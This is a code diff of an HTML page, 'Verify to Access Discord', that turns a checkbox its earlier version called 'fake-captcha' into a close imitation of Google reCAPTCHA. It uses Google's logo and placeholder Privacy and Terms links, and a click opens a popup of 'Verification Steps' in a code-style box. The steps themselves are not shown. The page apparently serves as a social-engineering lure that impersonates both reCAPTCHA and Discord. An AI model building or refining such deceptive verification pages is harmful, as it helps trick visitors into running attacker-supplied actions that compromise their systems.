@@ -1,50 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Verify to Access Discord</title>
   <style>
     body {
-      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      font-family: 'Segoe UI', sans-serif;
-      margin: 0;
     }
 
-    .container {
-      background: white;
+    .card {
+      background: #fff;
       padding: 30px;
-      border-radius: 15px;
+      border-radius: 12px;
       box-shadow: 0 10px 20px rgba(0,0,0,0.15);
       text-align: center;
     }
 
-    .title {
-      font-size: 1.5em;
-      font-weight: bold;
+    .card h2 {
       margin-bottom: 20px;
     }
 
-    .fake-captcha {
+    .recaptcha-box {
       display: flex;
       align-items: center;
-      justify-content: center;
-      gap: 10px;
-      font-size: 1.1em;
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
       padding: 15px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      cursor: pointer;
-      user-select: none;
-      background: #fff;
+      width: 300px;
+      margin: 0 auto;
+      background: #f9f9f9;
+      position: relative;
     }
 
-    .fake-captcha input {
-      transform: scale(1.5);
+    .recaptcha-checkbox {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #c1c1c1;
+      border-radius: 3px;
+      margin-right: 15px;
       cursor: pointer;
+      position: relative;
+    }
+
+    .recaptcha-checkbox.checked::after {
+      content: "✓";
+      color: #007bff;
+      font-size: 16px;
+      position: absolute;
+      top: 0;
+      left: 4px;
+    }
+
+    .recaptcha-label {
+      flex-grow: 1;
+      font-size: 14px;
+      color: #222;
+    }
+
+    .recaptcha-logo {
+      position: absolute;
+      right: 10px;
+      bottom: 5px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 9px;
+      color: #666;
+    }
+
+    .recaptcha-logo img {
+      width: 24px;
+      height: 24px;
     }
 
     .popup {
@@ -79,16 +112,25 @@
       border-left: 4px solid #33cc33;
       font-family: monospace;
     }
+
+    a {
+      color: #666;
+      text-decoration: none;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="title">Verify to access my Discord server</div>
+  <div class="card">
+    <h2>Verify to access my Discord server</h2>
 
-    <label class="fake-captcha">
-      <input type="checkbox" id="verifyCheckbox">
-      I'm not a robot
-    </label>
+    <div class="recaptcha-box" onclick="toggleCheck()">
+      <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
+      <div class="recaptcha-label">I'm not a robot</div>
+      <div class="recaptcha-logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+        <div><a href="#">Privacy</a> · <a href="#">Terms</a></div>
+      </div>
+    </div>
 
     <div class="popup" id="stepPopup">
       <h3>Complete these Verification Steps</h3>
@@ -102,12 +144,17 @@
   </div>
 
   <script>
-    const checkbox = document.getElementById('verifyCheckbox');
-    const popup = document.getElementById('stepPopup');
+    function toggleCheck() {
+      const checkbox = document.getElementById("recaptchaCheckbox");
+      const popup = document.getElementById("stepPopup");
 
-    checkbox.addEventListener('change', () => {
-      popup.style.display = checkbox.checked ? 'block' : 'none';
-    });
+      checkbox.classList.toggle("checked");
+      if (checkbox.classList.contains("checked")) {
+        popup.style.display = "block";
+      } else {
+        popup.style.display = "none";
+      }
+    }
   </script>
 </body>
 </html>
